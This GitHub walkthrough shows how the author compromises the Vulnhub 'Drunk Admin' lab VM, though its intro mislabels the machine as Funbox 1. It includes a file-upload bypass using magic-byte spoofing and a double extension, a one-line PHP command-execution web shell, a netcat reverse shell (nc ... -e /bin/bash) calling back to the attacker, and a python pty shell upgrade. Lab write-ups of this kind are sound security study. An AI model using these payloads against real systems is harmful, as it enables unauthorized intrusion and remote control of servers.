# Vulnhub--Drunk_Admin--Markup
 This is a walkthrough on how to pwn the Funbox 1 machine which is available on vulnhub 


After installing and running the vulnbox make sure both of them are on the same network. Then perform an arp-scan to identify the vulnbox’s ip address. 
In our case it was 192.168.86.129. 

![arp](https://github.com/omarMahmood05/Vulnhub--Drunk_Admin--Markup/assets/86721437/69b911ff-806e-4649-a98e-495994f72bfb)


Now let’s perform an NMAP scan on this using sudo nmap –sS 192.168.86.129 –p- 

![nmap](https://github.com/omarMahmood05/Vulnhub--Drunk_Admin--Markup/assets/86721437/399a56f7-effa-4bb9-b8b0-af8c60ec9578)


This shows us two open ports, 22 for SSH and 8880 with TCP. Let’s access this ip address on port 8880 using a web browser. 
We get an image hosting homepage. 

![homepage](https://github.com/omarMahmood05/Vulnhub--Drunk_Admin--Markup/assets/86721437/4c425529-18d1-4b0d-8cd8-ace8248ea8a7)

Let’s analyze this page, it doesn’t accept any non image extension. After uploading the image and observing the image path, it seems that the server is hashing the image name and hosting it on /image/md5(filename.jpg).jpg. This could be used to get an RCE.  

![you are naughty](https://github.com/omarMahmood05/Vulnhub--Drunk_Admin--Markup/assets/86721437/aef5a7f3-4d43-4690-b318-e9b5b2e2ccff)

We can find some PHP details through enumerating myphp.php page. 
After brute forcing through burp suite, we can find some sensitive details at
1.	http://192.168.86.129:8880/myphp.php?id=108
2.	http://192.168.86.129:8880/myphp.php?id=104
3.	http://192.168.86.129:8880/myphp.php?id=101
4.	http://192.168.86.129:8880/myphp.php?id=132
5.	http://192.168.86.129:8880/myphp.php?id=116

108

![108](https://github.com/omarMahmood05/Vulnhub--Drunk_Admin--Markup/assets/86721437/24866f09-3730-4a3c-ab64-edfdbef652cb)

104

![104](https://github.com/omarMahmood05/Vulnhub--Drunk_Admin--Markup/assets/86721437/6f53fa5a-e738-401a-9255-426fee6cb126)

101

![101](https://github.com/omarMahmood05/Vulnhub--Drunk_Admin--Markup/assets/86721437/d2523672-156f-40ee-a7c2-21861be02761)

132

![132](https://github.com/omarMahmood05/Vulnhub--Drunk_Admin--Markup/assets/86721437/bc92058c-d0e3-4a5a-8c10-e0d45bc29f87)

116

![116](https://github.com/omarMahmood05/Vulnhub--Drunk_Admin--Markup/assets/86721437/7bb40b18-73a0-4b06-9097-1a75621f3f6e)

Let’s try to bypass the file upload, we’ll use a combination of hex-spoofing as well as double-extension-attack.

We changed the first 8 bytes of the php file using hex-editor to match the same of a png file and we’ll save the file as shell.png.php. This gets accepted and gets uploaded to the server. 
![hexeditor](https://github.com/omarMahmood05/Vulnhub--Drunk_Admin--Markup/assets/86721437/6aa9853f-9410-464a-8965-681cbc13a14c)

We can access this file by the method that we saw above, which is by appending /images/md5(image-name).ext.

Let’s try to upload a shell now. I tried multiple shells but I got the same message “Ohhh you are naughty!”. Then I uploaded a command injection php script (<?php echo exec($_REQUEST[‘ cmd’]) ?> and the page accepted it. Now we can run commands on this server using images/6a9e40c5321f777ee7f19071637e36ab?cmd={command}. 

Using this technique I ran the command nc my-ip-address port –e /bin/bash
![remoteshell](https://github.com/omarMahmood05/Vulnhub--Drunk_Admin--Markup/assets/86721437/ea583c04-4798-4e9c-b80e-b60254170545)

Now I’ve got a remote shell on this server! Let’s upgrade out shell using python –c “import pty; pty.spawn(‘/bin/bash’)
![upgrade shell](https://github.com/omarMahmood05/Vulnhub--Drunk_Admin--Markup/assets/86721437/3951fb1f-d02a-4691-94f6-caa9ccb8d44f)

After some snooping around I found a file named .proof which contained a secret code. TGglMUxecjJDSDclN1Ej this is a base64 encoded text so let’s decode it. After decoding we get Lh%1L^r2CH7%7Q#
![proof](https://github.com/omarMahmood05/Vulnhub--Drunk_Admin--Markup/assets/86721437/a1b50996-4d77-4034-b0ad-24f950f4d5ae)

After snooping around further I found a user named bob that had a php file that could encrypt and decrypt a string. I moved the files to /var/www/html/images since we didn’t have any permissions. 
![dir](https://github.com/omarMahmood05/Vulnhub--Drunk_Admin--Markup/assets/86721437/b2e1d9d8-a1f6-45cc-9f72-9bbf556ec7dc)


![enc page](https://github.com/omarMahmood05/Vulnhub--Drunk_Admin--Markup/assets/86721437/00da96d6-d23f-434e-b788-83ebd39c8807)

![final message](https://github.com/omarMahmood05/Vulnhub--Drunk_Admin--Markup/assets/86721437/4f31593c-ded3-4d8a-8647-7131d10deef6)

Alice, prepare for a kinky night. Meet me at '35.517286' '24.017637'


